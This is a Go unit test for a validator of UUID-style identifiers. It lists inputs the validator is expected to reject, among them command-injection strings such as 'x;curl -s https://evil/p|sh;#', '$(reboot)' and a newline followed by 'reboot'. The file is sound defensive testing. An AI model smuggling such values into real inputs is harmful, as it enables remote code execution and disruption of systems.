package gcsid

import "testing"

func TestValidate(t *testing.T) {
	for _, tc := range []struct {
		id string
		ok bool
	}{
		{"12ba8822-3f4e-4c1a-9d2b-0123456789ab", true},
		{"12BA8822-3F4E-4C1A-9D2B-0123456789AB", true},
		{"", false},
		{"12ba8822", false},
		{"12ba8822-3f4e-4c1a-9d2b-0123456789ab;id", false},
		{"x;curl -s https://evil/p|sh;#", false},
		{"$(reboot)", false},
		{"12ba8822-3f4e-4c1a-9d2b-0123456789ab\nreboot", false},
		{" 12ba8822-3f4e-4c1a-9d2b-0123456789ab", false},
		{"12ba8822-3f4e-4c1a-9d2b-0123456789a`", false},
	} {
		if err := Validate(tc.id); (err == nil) != tc.ok {
			t.Errorf("Validate(%q) error = %v, want ok=%v", tc.id, err, tc.ok)
		}
	}
}
